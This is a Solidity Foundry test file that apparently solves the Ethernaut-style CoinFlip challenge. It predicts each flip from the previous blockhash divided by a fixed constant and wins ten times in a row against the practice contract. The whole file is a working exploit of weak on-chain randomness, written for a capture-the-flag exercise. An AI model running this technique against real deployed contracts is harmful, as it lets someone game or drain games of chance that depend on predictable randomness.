// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {CoinFlip} from "../src/03_CoinFlip.sol";

contract CoinFlipTest is Test {
    CoinFlip public cf;

    address public hacker = address(0x1337);

    function setUp() public {
        cf = new CoinFlip();
        vm.deal(hacker, 1 ether);
    }

    function testExploit() public {
        vm.startPrank(hacker);
        uint256 lastHash;
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        for (uint8 i; i < 10; ++i) {
            vm.roll(block.number + 1);
            uint256 blockValue = uint256(blockhash(block.number - 1));

            if (lastHash == blockValue) {
                revert();
            }

            lastHash = blockValue;
            uint256 coinFlip = blockValue / FACTOR;
            bool side = coinFlip == 1 ? true : false;
            cf.flip(side);
        }
        assertEq(cf.consecutiveWins(), 10);
        vm.stopPrank();
    }
}
